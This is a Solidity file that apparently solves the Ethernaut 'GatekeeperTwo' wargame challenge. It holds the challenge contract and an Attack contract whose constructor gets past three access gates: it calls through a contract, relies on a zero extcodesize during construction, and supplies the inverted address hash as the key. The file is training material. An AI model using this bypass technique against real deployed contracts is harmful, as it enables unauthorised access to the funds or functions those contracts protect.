// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  // must be called only from a contract
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  // must be called from the contract's constructor (during constructor() there's no execution code)
  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  // _gateKey must be the inversion of bytes8(keccak256(abi.encodePacked(msg.sender)))
  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attack {
    constructor(GatekeeperTwo _target) {
        _target.enter(~bytes8(keccak256(abi.encodePacked(address(this)))));
    }
}